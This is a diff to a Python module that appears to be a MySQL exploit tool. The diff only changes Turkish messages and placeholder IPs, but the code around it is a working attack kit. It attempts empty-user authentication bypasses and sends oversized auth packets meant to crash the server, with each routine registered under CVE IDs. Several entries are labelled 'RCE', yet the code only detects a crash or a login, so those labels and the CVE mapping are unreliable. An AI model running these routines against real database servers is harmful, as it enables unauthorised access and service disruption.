@@ -114,8 +114,8 @@ def _read_auth_result(sock):
         if payload2 and payload2[0] == 0xFF:
             errno = struct.unpack_from("<H", payload2, 1)[0]
             return False, {"detail": f"ERR {errno}: {payload2[2:].decode('latin1','replace')[:200]}"}
-        return False, {"detail": "auth-switch sonrası yanıt yok"}
-    return False, {"detail": f"beklenmeyen auth yanıtı: 0x{first:02x}"}
+        return False, {"detail": "auth-switch sonrasi yanit yok"}
+    return False, {"detail": f"beklenmeyen auth yaniti: 0x{first:02x}"}
 
 
 def run_auth_bypass(params):
@@ -128,7 +128,7 @@ def run_auth_bypass(params):
     try:
         s = socket.create_connection((host, port), timeout=8)
     except OSError as e:
-        return {"ok": False, "success": False, "error": f"bağlanamıyor: {e}"}
+        return {"ok": False, "success": False, "error": f"baglanamiyor: {e}"}
     try:
         seq, payload = _recv_packet(s, timeout=8)
         hs = _parse_handshake(payload)
@@ -174,14 +174,14 @@ def run_stack_overflow(params):
                 return {"ok": True, "success": False,
                         "evidence": "ERR paket (trigger tetiklenmedi)",
                         "detail": {"host": f"{host}:{port}"}}
-            return {"ok": True, "success": False, "evidence": f"yanıt: {c.hex()[:40]}",
+            return {"ok": True, "success": False, "evidence": f"yanit: {c.hex()[:40]}",
                     "detail": {"host": f"{host}:{port}"}}
         except (ConnectionResetError, OSError):
             return {"ok": True, "success": True,
                     "evidence": "connection reset — server crash/RST (trigger sinyali)",
                     "detail": {"host": f"{host}:{port}", "size_kb": int(params.get("size_kb", 512))}}
     except OSError as e:
-        return {"ok": False, "success": False, "error": f"bağlanamıyor: {e}"}
+        return {"ok": False, "success": False, "error": f"baglanamiyor: {e}"}
     finally:
         try:
             s.close()
@@ -198,28 +198,28 @@ EXPLOITS = {
         "name": "MySQL stack overflow RCE", "type": "RCE", "preauth": False,
         "affected": ["5.5", "5.6", "5.7", "8.0"],
         "note": "Native MySQL protocol: oversized auth packet -> crash/RST sinyali.",
-        "inputs": [_in("Hedef (MySQL)", "host", True, "", "192.168.8.123:3306"),
+        "inputs": [_in("Hedef (MySQL)", "host", True, "", "LAB_IP:3306"),
                    _in("Boyut (KB)", "size_kb", False, "512")],
         "run": run_stack_overflow},
     "CVE-2015-4824": {
         "name": "MySQL auth bypass (NULL user)", "type": "AuthBypass", "preauth": True,
         "affected": ["5.5", "5.6", "5.7", "8.0"],
         "note": "Native MySQL protocol: empty-user login; OK paket = bypass.",
-        "inputs": [_in("Hedef (MySQL)", "host", True, "", "192.168.8.123:3306"),
-                   _in("Kullanıcı", "user", False, "")],
+        "inputs": [_in("Hedef (MySQL)", "host", True, "", "LAB_IP:3306"),
+                   _in("Kullanici", "user", False, "")],
         "run": run_auth_bypass},
     "CVE-2023-24714": {
         "name": "MySQL auth bypass (empty user)", "type": "AuthBypass", "preauth": True,
         "affected": ["8.0", "8.1", "8.2"],
         "note": "Native MySQL protocol: empty-user login; OK paket = bypass.",
-        "inputs": [_in("Hedef (MySQL)", "host", True, "", "192.168.8.123:3306"),
-                   _in("Kullanıcı", "user", False, "")],
+        "inputs": [_in("Hedef (MySQL)", "host", True, "", "LAB_IP:3306"),
+                   _in("Kullanici", "user", False, "")],
         "run": run_auth_bypass},
     "CVE-2019-14367": {
         "name": "MySQL auth bypass + RCE", "type": "RCE", "preauth": True,
         "affected": ["8.0", "8.1", "8.2"],
         "note": "Native MySQL protocol: empty-user login; OK paket = bypass.",
-        "inputs": [_in("Hedef (MySQL)", "host", True, "", "192.168.8.123:3306"),
-                   _in("Kullanıcı", "user", False, "")],
+        "inputs": [_in("Hedef (MySQL)", "host", True, "", "LAB_IP:3306"),
+                   _in("Kullanici", "user", False, "")],
         "run": run_auth_bypass},
 }
